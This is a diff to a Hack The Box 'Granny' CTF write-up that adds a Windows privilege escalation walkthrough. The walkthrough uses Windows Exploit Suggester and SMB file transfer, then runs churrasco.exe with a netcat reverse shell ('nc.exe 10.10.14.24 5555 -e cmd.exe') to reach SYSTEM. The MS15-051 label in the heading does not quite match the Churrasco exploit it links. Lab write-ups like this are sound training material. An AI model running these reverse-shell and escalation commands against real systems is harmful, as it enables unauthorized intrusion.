@@ -83,16 +83,65 @@ We got the shell, and there's no privilege to read user.txt flag.
 
 ## Privilege Escalation
 
-### Method 1: 
+### Method 1: MS15-051 [1](https://github.com/Re4son/Churrasco) / CVE:N/A [2](https://www.exploit-db.com/exploits/6705)
+Run `systeminfo` command:
 
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6515a046-7ff5-44d9-97c0-9474442fb379)
+
+```
+systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/20c25173-1276-4990-ad97-70c861e7ff03)
+
+Run Windows Exploit Suggester:
+
+```
+# On the kali attack vm:
+python2 windows-exploit-suggester.py --update
+
+python2 windows-exploit-suggester.py --database 2024-04-15-mssb.xls --systeminfo systeminfo.txt
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/287d5c3d-4949-47e9-a841-b029af5fe2f0)
+
+There are many exploits for privilege escalation here, but for now try **MS15-051**.
+
+Download exploit [1](https://github.com/Re4son/Churrasco), and transfer to the target victim, then prepare netcat listener, and run the MS15-051.exe:
+
+```
+# On the kali attack vm:
+smbserver.py desktop /home/kali/Desktop
+
+smbserver.py win /usr/share/windows-binaries/
+
+nc -lnvp 5555
+
+# On the target machine:
+cd c:\inetpub\wwwroot
+
+copy \\10.10.14.24\desktop\churrasco.exe
+
+copy \\10.10.14.24\win\nc.exe
+
+churrasco.exe -d "C:\Inetpub\wwwroot\nc.exe 10.10.14.24 5555 -e cmd.exe"
+```
+
+Get the shell as **nt authority\system**, and read both user.txt flag and root.txt flag:
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/86116b29-e1bd-41bd-b658-be751f8e5c84)
 
 
 # References & Alternatives
-+ x
++ https://vvmlist.github.io/#Granny
++ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/granny-writeup-w-o-and-w-metasploit
++ 
 
 
 ## CVE Scripting
-+ x
++ **MS15-051:**
+  + https://www.exploit-db.com/exploits/6705
+  + https://github.com/Re4son/Churrasco
 
 
 ## Tools
